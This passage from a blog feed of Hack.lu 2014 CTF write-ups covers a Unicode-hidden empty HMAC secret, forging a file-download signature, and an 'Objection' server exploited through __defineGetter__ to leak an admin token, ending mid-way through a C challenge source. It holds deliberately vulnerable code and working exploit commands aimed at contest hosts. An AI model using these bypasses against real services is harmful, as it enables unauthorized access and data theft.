</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">user_possible</span><span class="p">(</span><span class="nx">user</span><span class="p">))</span> <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s1">&#39;bad user&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="nx">sanitize_filename</span><span class="p">(</span><span class="nx">file</span><span class="p">)</span> <span class="o">!==</span> <span class="nx">file</span><span class="p">)</span> <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s1">&#39;bad filename&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="nx">hmac_sign</span><span class="p">(</span><span class="nx">user</span><span class="o">+</span><span class="s1">&#39;/&#39;</span><span class="o">+</span><span class="nx">file</span><span class="p">)</span> <span class="o">!==</span> <span class="nx">signature</span><span class="p">)</span> <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s1">&#39;bad signature&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="nx">res</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="s1">&#39;Content-Type&#39;</span><span class="p">,</span> <span class="s1">&#39;text/plain&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="nx">res</span><span class="p">.</span><span class="nx">sendfile</span><span class="p">(</span><span class="s1">&#39;users/&#39;</span><span class="o">+</span><span class="nx">user</span><span class="o">+</span><span class="s1">&#39;/files/&#39;</span><span class="o">+</span><span class="nx">file</span><span class="p">)</span>
</span><span class='line'><span class="p">})</span>
</span></code></pre></td></tr></table></div></figure>

<h2>Analysis</h2>

<p>The trick here is in the for loop where <code>HMAC_SECRET</code> is being updated, they
actually use unicode to hide the fact that a different variable gets updated.
So the actual secret is empty.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='js'><span class='line'><span class="nx">$</span> <span class="nx">echo</span> <span class="o">-</span><span class="nx">n</span> <span class="s2">&quot;testuser/flag.txt&quot;</span> <span class="o">|</span> <span class="nx">openssl</span> <span class="nx">dgst</span> <span class="o">-</span><span class="nx">sha256</span> <span class="o">-</span><span class="nx">hmac</span> <span class="s2">&quot;&quot;</span>
</span><span class='line'><span class="p">(</span><span class="nx">stdin</span><span class="p">)</span><span class="o">=</span> <span class="mi">4</span><span class="nx">a332c7f27909f85a529393cea72301393f84cf5908aa2538137776f78624db4</span>
</span><span class='line'><span class="nx">$</span>
</span></code></pre></td></tr></table></div></figure>

<p>So, the url is</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='js'><span class='line'><span class="nx">https</span><span class="o">:</span><span class="c1">//wildwildweb.fluxfingers.net:1409/files/testuser/flag.txt/4a332c7f27909f85a529393cea72301393f84cf5908aa2538137776f78624db4</span>
</span></code></pre></td></tr></table></div></figure>
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='js'><span class='line'><span class="nx">flag</span><span class="p">{</span><span class="nx">unicode_stego_is_best_stego</span><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Hack.lu 2014 - Objection]]></title>
    <link href="http://www.captchaflag.com/blog/2014/10/23/hack-dot-lu-2014-objection/"/>
    <updated>2014-10-23T12:51:00-04:00</updated>
    <id>http://www.captchaflag.com/blog/2014/10/23/hack-dot-lu-2014-objection</id>
    <content type="html"><![CDATA[<h2>Challenge</h2>

<p>This guard talks a weird dialect. And why does he talk in such a complicated
way?
<a href="https://wildwildweb.fluxfingers.net/static/chals/objection_4966674d17ff296939c0e3dfccfe87ed.co">Download</a></p>

<p>nc wildwildweb.fluxfingers.net 1408</p>

<h2>Analysis</h2>

<p>Downloading the file gives us:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class='coffeescript'><span class='line'><span class="nx">const</span> <span class="nv">net = </span><span class="nx">require</span> <span class="err">\</span><span class="nx">net</span>
</span><span class='line'><span class="nx">const</span> <span class="nv">BufferStream = </span><span class="nx">require</span> <span class="err">\</span><span class="nx">bufferstream</span>
</span><span class='line'>
</span><span class='line'><span class="nv">admin_password = </span><span class="p">(</span><span class="nx">require</span> <span class="err">\</span><span class="nx">fs</span><span class="p">).</span><span class="nx">readFileSync</span> <span class="err">\</span><span class="nx">admin_password</span><span class="p">,</span> <span class="err">\</span><span class="nx">utf8</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="nv">server = </span><span class="nx">net</span><span class="p">.</span><span class="nx">createServer</span> <span class="nf">(con) -&gt;</span>
</span><span class='line'>  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span> <span class="s">&#39;client connected&#39;</span>
</span><span class='line'>  <span class="nx">con</span><span class="p">.</span><span class="nx">write</span> <span class="s">&#39;hello!\n&#39;</span>
</span><span class='line'>  <span class="nv">client_context =</span>
</span><span class='line'>    <span class="nv">is_admin: </span><span class="kc">false</span>
</span><span class='line'>    <span class="nv">token: </span><span class="p">(</span><span class="nx">require</span> <span class="err">\</span><span class="nx">fs</span><span class="p">).</span><span class="nx">readFileSync</span> <span class="err">\</span><span class="nx">secret_token</span><span class="p">,</span> <span class="err">\</span><span class="nx">utf8</span>
</span><span class='line'>    <span class="nv">login: </span><span class="nf">([password], cb) -&gt;</span>
</span><span class='line'>      <span class="k">if</span> <span class="nx">password</span> <span class="o">==</span> <span class="nx">admin_password</span>
</span><span class='line'>        <span class="nx">cb</span> <span class="s">&quot;Authentication successful&quot;</span>
</span><span class='line'>        <span class="vi">@is_admin = </span><span class="kc">true</span>
</span><span class='line'>      <span class="k">else</span>
</span><span class='line'>        <span class="nx">cb</span> <span class="s">&quot;Authentication failed&quot;</span>
</span><span class='line'>    <span class="nv">get_token: </span><span class="nf">([], cb) -&gt;</span>
</span><span class='line'>      <span class="k">if</span> <span class="o">not</span> <span class="nx">@is_admin</span> <span class="k">then</span> <span class="k">return</span> <span class="nx">cb</span> <span class="s">&quot;You are not authorized to perform this action.&quot;</span>
</span><span class='line'>      <span class="nx">cb</span> <span class="s">&quot;The current token is </span><span class="si">#{</span><span class="nx">@token</span><span class="si">}</span><span class="s">&quot;</span>
</span><span class='line'>  <span class="nv">in_stream = </span><span class="k">new</span> <span class="nx">BufferStream</span> <span class="p">{</span><span class="nx">encoding</span><span class="o">:</span><span class="err">\</span><span class="nx">utf8</span><span class="p">,</span> <span class="nx">size</span><span class="o">:</span><span class="err">\</span><span class="nx">flexible</span><span class="p">}</span>
</span><span class='line'>  <span class="nx">con</span><span class="p">.</span><span class="nx">pipe</span> <span class="nx">in_stream</span>
</span><span class='line'>  <span class="o">&lt;-</span> <span class="nx">in_stream</span><span class="p">.</span><span class="nx">split</span> <span class="err">\\</span><span class="nx">n</span>
</span><span class='line'>  <span class="nx">it</span> <span class="p">.</span><span class="o">=</span> <span class="nx">toString</span> <span class="err">\</span><span class="nx">utf8</span>
</span><span class='line'>  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span> <span class="s">&quot;got line: </span><span class="si">#{</span><span class="nx">it</span><span class="si">}</span><span class="s">&quot;</span>
</span><span class='line'>  <span class="p">[</span><span class="nx">funcname</span><span class="p">,</span> <span class="p">...</span><span class="nx">args</span><span class="p">]</span> <span class="o">=</span> <span class="nx">it</span><span class="p">.</span><span class="nx">split</span> <span class="s">&#39; &#39;</span>
</span><span class='line'>  <span class="k">if</span> <span class="k">typeof</span> <span class="nx">client_context</span><span class="p">[</span><span class="nx">funcname</span><span class="p">]</span> <span class="o">!=</span> <span class="err">\</span><span class="nx">function</span>
</span><span class='line'>    <span class="k">return</span> <span class="nx">con</span><span class="p">.</span><span class="nx">write</span> <span class="s">&quot;error: unknown function </span><span class="err">#</span><span class="s">funcname\n&quot;</span>
</span><span class='line'>  <span class="nx">client_context</span><span class="p">[</span><span class="nx">funcname</span><span class="p">]</span> <span class="nx">args</span><span class="p">,</span> <span class="o">-&gt;</span>
</span><span class='line'>    <span class="nx">con</span><span class="p">.</span><span class="nx">write</span> <span class="s">&quot;</span><span class="err">#</span><span class="s">it\n&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="nx">server</span><span class="p">.</span><span class="nx">listen</span> <span class="mi">1408</span><span class="p">,</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span> <span class="s">&#39;server bound&#39;</span>
</span></code></pre></td></tr></table></div></figure>

<p>Clearly, we would like to get the token.  Calling <code>get_token()</code> requires knowing
the admin password.  The key thing to notice is the follow bit of code where
user input is parsed and used:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='coffeescript'><span class='line'>  <span class="nv">in_stream = </span><span class="k">new</span> <span class="nx">BufferStream</span> <span class="p">{</span><span class="nx">encoding</span><span class="o">:</span><span class="err">\</span><span class="nx">utf8</span><span class="p">,</span> <span class="nx">size</span><span class="o">:</span><span class="err">\</span><span class="nx">flexible</span><span class="p">}</span>
</span><span class='line'>  <span class="nx">con</span><span class="p">.</span><span class="nx">pipe</span> <span class="nx">in_stream</span>
</span><span class='line'>  <span class="o">&lt;-</span> <span class="nx">in_stream</span><span class="p">.</span><span class="nx">split</span> <span class="err">\\</span><span class="nx">n</span>
</span><span class='line'>  <span class="nx">it</span> <span class="p">.</span><span class="o">=</span> <span class="nx">toString</span> <span class="err">\</span><span class="nx">utf8</span>
</span><span class='line'>  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span> <span class="s">&quot;got line: </span><span class="si">#{</span><span class="nx">it</span><span class="si">}</span><span class="s">&quot;</span>
</span><span class='line'>  <span class="p">[</span><span class="nx">funcname</span><span class="p">,</span> <span class="p">...</span><span class="nx">args</span><span class="p">]</span> <span class="o">=</span> <span class="nx">it</span><span class="p">.</span><span class="nx">split</span> <span class="s">&#39; &#39;</span>
</span><span class='line'>  <span class="k">if</span> <span class="k">typeof</span> <span class="nx">client_context</span><span class="p">[</span><span class="nx">funcname</span><span class="p">]</span> <span class="o">!=</span> <span class="err">\</span><span class="nx">function</span>
</span><span class='line'>    <span class="k">return</span> <span class="nx">con</span><span class="p">.</span><span class="nx">write</span> <span class="s">&quot;error: unknown function </span><span class="err">#</span><span class="s">funcname\n&quot;</span>
</span><span class='line'>  <span class="nx">client_context</span><span class="p">[</span><span class="nx">funcname</span><span class="p">]</span> <span class="nx">args</span><span class="p">,</span> <span class="o">-&gt;</span>
</span><span class='line'>    <span class="nx">con</span><span class="p">.</span><span class="nx">write</span> <span class="s">&quot;</span><span class="err">#</span><span class="s">it\n&quot;</span>
</span></code></pre></td></tr></table></div></figure>

<p>The first word of input is checked to be a function of the <code>client_context</code>
object.  Since this is turned into javascript, there will be many built-in
methods we could call besides <code>get_token()</code> and <code>login()</code>.</p>

<p>One method, <code>__defineGetter__</code> takes as parameters a property and a function
body.  By overriding <code>is_admin</code> with the function: <code>-&gt; con.write &quot;#it\n</code>, the
check in <code>get_token()</code> will not function as expected, and we will be able to see
the token.</p>

<h2>Solution</h2>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='coffeescript'><span class='line'><span class="nx">$</span> <span class="nx">echo</span> <span class="o">-</span><span class="nx">e</span> <span class="s">&quot;__defineGetter__ is_admin\nget_token&quot;</span> <span class="o">|</span> <span class="nx">nc</span> <span class="nx">wildwildweb</span><span class="p">.</span><span class="nx">fluxfingers</span><span class="p">.</span><span class="nx">net</span> <span class="mi">1408</span>
</span><span class='line'><span class="nx">hello</span><span class="o">!</span>
</span><span class='line'><span class="kc">undefined</span>
</span><span class='line'><span class="nx">The</span> <span class="nx">current</span> <span class="nx">token</span> <span class="o">is</span> <span class="nx">flag</span><span class="p">{</span><span class="nx">real_cowboys_dont_use_object_create_null</span><span class="p">}</span>
</span><span class='line'><span class="nx">$</span>
</span></code></pre></td></tr></table></div></figure>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Hack.lu 2014 - Personnel Database]]></title>
    <link href="http://www.captchaflag.com/blog/2014/10/23/hack-dot-lu-2014-personnel-database/"/>
    <updated>2014-10-23T10:23:00-04:00</updated>
    <id>http://www.captchaflag.com/blog/2014/10/23/hack-dot-lu-2014-personnel-database</id>
    <content type="html"><![CDATA[<h2>Challenge</h2>

<p>Lots of criminals in this area work for one big boss, but we have been unable to
determine who he is. We know that their organization has one central personnel
database that might also contain information about their boss, whose username is
simply “boss”. However, when you register in their system, you only get access
level zero, which is not enough for reading data about the boss - that guy is
level 10. Do you think you can get around their protections? </p>

<p>Download</p>

<p>nc wildwildweb.fluxfingers.net 1410</p>

<p>Note: The users dir will be wiped every 5 minutes.</p>

<h2>Analysis</h2>

<p>Downloading the file gives us:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
<span class='line-number'>143</span>
<span class='line-number'>144</span>
<span class='line-number'>145</span>
<span class='line-number'>146</span>
<span class='line-number'>147</span>
<span class='line-number'>148</span>
<span class='line-number'>149</span>
<span class='line-number'>150</span>
<span class='line-number'>151</span>
<span class='line-number'>152</span>
<span class='line-number'>153</span>
<span class='line-number'>154</span>
<span class='line-number'>155</span>
<span class='line-number'>156</span>
<span class='line-number'>157</span>
<span class='line-number'>158</span>
<span class='line-number'>159</span>
<span class='line-number'>160</span>
<span class='line-number'>161</span>
<span class='line-number'>162</span>
<span class='line-number'>163</span>
<span class='line-number'>164</span>
<span class='line-number'>165</span>
<span class='line-number'>166</span>
<span class='line-number'>167</span>
<span class='line-number'>168</span>
<span class='line-number'>169</span>
<span class='line-number'>170</span>
<span class='line-number'>171</span>
<span class='line-number'>172</span>
<span class='line-number'>173</span>
<span class='line-number'>174</span>
<span class='line-number'>175</span>
<span class='line-number'>176</span>
<span class='line-number'>177</span>
<span class='line-number'>178</span>
<span class='line-number'>179</span>
<span class='line-number'>180</span>
<span class='line-number'>181</span>
<span class='line-number'>182</span>
<span class='line-number'>183</span>
<span class='line-number'>184</span>
<span class='line-number'>185</span>
<span class='line-number'>186</span>
<span class='line-number'>187</span>
<span class='line-number'>188</span>
<span class='line-number'>189</span>
<span class='line-number'>190</span>
<span class='line-number'>191</span>
<span class='line-number'>192</span>
<span class='line-number'>193</span>
<span class='line-number'>194</span>
<span class='line-number'>195</span>
<span class='line-number'>196</span>
<span class='line-number'>197</span>
<span class='line-number'>198</span>
<span class='line-number'>199</span>
<span class='line-number'>200</span>
<span class='line-number'>201</span>
<span class='line-number'>202</span>
<span class='line-number'>203</span>
<span class='line-number'>204</span>
<span class='line-number'>205</span>
<span class='line-number'>206</span>
<span class='line-number'>207</span>
<span class='line-number'>208</span>
<span class='line-number'>209</span>
<span class='line-number'>210</span>
<span class='line-number'>211</span>
<span class='line-number'>212</span>
<span class='line-number'>213</span>
<span class='line-number'>214</span>
<span class='line-number'>215</span>
<span class='line-number'>216</span>
<span class='line-number'>217</span>
<span class='line-number'>218</span>
<span class='line-number'>219</span>
<span class='line-number'>220</span>
<span class='line-number'>221</span>
<span class='line-number'>222</span>
<span class='line-number'>223</span>
<span class='line-number'>224</span>
<span class='line-number'>225</span>
<span class='line-number'>226</span>
<span class='line-number'>227</span>
<span class='line-number'>228</span>
<span class='line-number'>229</span>
<span class='line-number'>230</span>
<span class='line-number'>231</span>
<span class='line-number'>232</span>
<span class='line-number'>233</span>
<span class='line-number'>234</span>
<span class='line-number'>235</span>
<span class='line-number'>236</span>
<span class='line-number'>237</span>
<span class='line-number'>238</span>
<span class='line-number'>239</span>
<span class='line-number'>240</span>
<span class='line-number'>241</span>
<span class='line-number'>242</span>
<span class='line-number'>243</span>
<span class='line-number'>244</span>
<span class='line-number'>245</span>
<span class='line-number'>246</span>
<span class='line-number'>247</span>
<span class='line-number'>248</span>
<span class='line-number'>249</span>
<span class='line-number'>250</span>
<span class='line-number'>251</span>
<span class='line-number'>252</span>
<span class='line-number'>253</span>
<span class='line-number'>254</span>
<span class='line-number'>255</span>
<span class='line-number'>256</span>
<span class='line-number'>257</span>
<span class='line-number'>258</span>
<span class='line-number'>259</span>
<span class='line-number'>260</span>
<span class='line-number'>261</span>
<span class='line-number'>262</span>
<span class='line-number'>263</span>
<span class='line-number'>264</span>
<span class='line-number'>265</span>
<span class='line-number'>266</span>
<span class='line-number'>267</span>
<span class='line-number'>268</span>
<span class='line-number'>269</span>
<span class='line-number'>270</span>
<span class='line-number'>271</span>
<span class='line-number'>272</span>
<span class='line-number'>273</span>
<span class='line-number'>274</span>
<span class='line-number'>275</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdbool.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;errno.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;arpa/inet.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/socket.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;netinet/in.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdint.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/stat.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;fcntl.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="k">static</span> <span class="kt">uint32_t</span> <span class="n">crc32_tab</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
</span><span class='line'>  <span class="mh">0x00000000</span><span class="p">,</span> <span class="mh">0x77073096</span><span class="p">,</span> <span class="mh">0xee0e612c</span><span class="p">,</span> <span class="mh">0x990951ba</span><span class="p">,</span> <span class="mh">0x076dc419</span><span class="p">,</span> <span class="mh">0x706af48f</span><span class="p">,</span>
</span><span class='line'>  <span class="mh">0xe963a535</span><span class="p">,</span> <span class="mh">0x9e6495a3</span><span class="p">,</span> <span class="mh">0x0edb8832</span><span class="p">,</span> <span class="mh">0x79dcb8a4</span><span class="p">,</span> <span class="mh">0xe0d5e91e</span><span class="p">,</span> <span class="mh">0x97d2d988</span><span class="p">,</span>
</span><span class='line'>  <span class="mh">0x09b64c2b</span><span class="p">,</span> <span class="mh">0x7eb17cbd</span><span class="p">,</span> <span class="mh">0xe7b82d07</span><span class="p">,</span> <span class="mh">0x90bf1d91</span><span class="p">,</span> <span class="mh">0x1db71064</span><span class="p">,</span> <span class="mh">0x6ab020f2</span><span class="p">,</span>
</span><span class='line'>  <span class="mh">0xf3b97148</span><span class="p">,</span> <span class="mh">0x84be41de</span><span class="p">,</span> <span class="mh">0x1adad47d</span><span class="p">,</span> <span class="mh">0x6ddde4eb</span><span class="p">,</span> <span class="mh">0xf4d4b551</span><span class="p">,</span> <span class="mh">0x83d385c7</span><span class="p">,</span>
</span><span class='line'>  <span class="mh">0x136c9856</span><span class="p">,</span> <span class="mh">0x646ba8c0</span><span class="p">,</span> <span class="mh">0xfd62f97a</span><span class="p">,</span> <span class="mh">0x8a65c9ec</span><span class="p">,</span> <span class="mh">0x14015c4f</span><span class="p">,</span> <span class="mh">0x63066cd9</span><span class="p">,</span>
</span><span class='line'>  <span class="mh">0xfa0f3d63</span><span class="p">,</span> <span class="mh">0x8d080df5</span><span class="p">,</span> <span class="mh">0x3b6e20c8</span><span class="p">,</span> <span class="mh">0x4c69105e</span><span class="p">,</span> <span class="mh">0xd56041e4</span><span class="p">,</span> <span class="mh">0xa2677172</span><span class="p">,</span>
</span><span class='line'>  <span class="mh">0x3c03e4d1</span><span class="p">,</span> <span class="mh">0x4b04d447</span><span class="p">,</span> <span class="mh">0xd20d85fd</span><span class="p">,</span> <span class="mh">0xa50ab56b</span><span class="p">,</span> <span class="mh">0x35b5a8fa</span><span class="p">,</span> <span class="mh">0x42b2986c</span><span class="p">,</span>
</span><span class='line'>  <span class="mh">0xdbbbc9d6</span><span class="p">,</span> <span class="mh">0xacbcf940</span><span class="p">,</span> <span class="mh">0x32d86ce3</span><span class="p">,</span> <span class="mh">0x45df5c75</span><span class="p">,</span> <span class="mh">0xdcd60dcf</span><span class="p">,</span> <span class="mh">0xabd13d59</span><span class="p">,</span>
</span><span class='line'>  <span class="mh">0x26d930ac</span><span class="p">,</span> <span class="mh">0x51de003a</span><span class="p">,</span> <span class="mh">0xc8d75180</span><span class="p">,</span> <span class="mh">0xbfd06116</span><span class="p">,</span> <span class="mh">0x21b4f4b5</span><span class="p">,</span> <span class="mh">0x56b3c423</span><span class="p">,</span>
</span><span class='line'>  <span class="mh">0xcfba9599</span><span class="p">,</span> <span class="mh">0xb8bda50f</span><span class="p">,</span> <span class="mh">0x2802b89e</span><span class="p">,</span> <span class="mh">0x5f058808</span><span class="p">,</span> <span class="mh">0xc60cd9b2</span><span class="p">,</span> <span class="mh">0xb10be924</span><span class="p">,</span>
</span><span class='line'>  <span class="mh">0x2f6f7c87</span><span class="p">,</span> <span class="mh">0x58684c11</span><span class="p">,</span> <span class="mh">0xc1611dab</span><span class="p">,</span> <span class="mh">0xb6662d3d</span><span class="p">,</span> <span class="mh">0x76dc4190</span><span class="p">,</span> <span class="mh">0x01db7106</span><span class="p">,</span>
</span><span class='line'>  <span class="mh">0x98d220bc</span><span class="p">,</span> <span class="mh">0xefd5102a</span><span class="p">,</span> <span class="mh">0x71b18589</span><span class="p">,</span> <span class="mh">0x06b6b51f</span><span class="p">,</span> <span class="mh">0x9fbfe4a5</span><span class="p">,</span> <span class="mh">0xe8b8d433</span><span class="p">,</span>
</span><span class='line'>  <span class="mh">0x7807c9a2</span><span class="p">,</span> <span class="mh">0x0f00f934</span><span class="p">,</span> <span class="mh">0x9609a88e</span><span class="p">,</span> <span class="mh">0xe10e9818</span><span class="p">,</span> <span class="mh">0x7f6a0dbb</span><span class="p">,</span> <span class="mh">0x086d3d2d</span><span class="p">,</span>
</span><span class='line'>  <span class="mh">0x91646c97</span><span class="p">,</span> <span class="mh">0xe6635c01</span><span class="p">,</span> <span class="mh">0x6b6b51f4</span><span class="p">,</span> <span class="mh">0x1c6c6162</span><span class="p">,</span> <span class="mh">0x856530d8</span><span class="p">,</span> <span class="mh">0xf262004e</span><span class="p">,</span>
</span><span class='line'>  <span class="mh">0x6c0695ed</span><span class="p">,</span> <span class="mh">0x1b01a57b</span><span class="p">,</span> <span class="mh">0x8208f4c1</span><span class="p">,</span> <span class="mh">0xf50fc457</span><span class="p">,</span> <span class="mh">0x65b0d9c6</span><span class="p">,</span> <span class="mh">0x12b7e950</span><span class="p">,</span>
</span><span class='line'>  <span class="mh">0x8bbeb8ea</span><span class="p">,</span> <span class="mh">0xfcb9887c</span><span class="p">,</span> <span class="mh">0x62dd1ddf</span><span class="p">,</span> <span class="mh">0x15da2d49</span><span class="p">,</span> <span class="mh">0x8cd37cf3</span><span class="p">,</span> <span class="mh">0xfbd44c65</span><span class="p">,</span>
</span><span class='line'>  <span class="mh">0x4db26158</span><span class="p">,</span> <span class="mh">0x3ab551ce</span><span class="p">,</span> <span class="mh">0xa3bc0074</span><span class="p">,</span> <span class="mh">0xd4bb30e2</span><span class="p">,</span> <span class="mh">0x4adfa541</span><span class="p">,</span> <span class="mh">0x3dd895d7</span><span class="p">,</span>
</span><span class='line'>  <span class="mh">0xa4d1c46d</span><span class="p">,</span> <span class="mh">0xd3d6f4fb</span><span class="p">,</span> <span class="mh">0x4369e96a</span><span class="p">,</span> <span class="mh">0x346ed9fc</span><span class="p">,</span> <span class="mh">0xad678846</span><span class="p">,</span> <span class="mh">0xda60b8d0</span><span class="p">,</span>
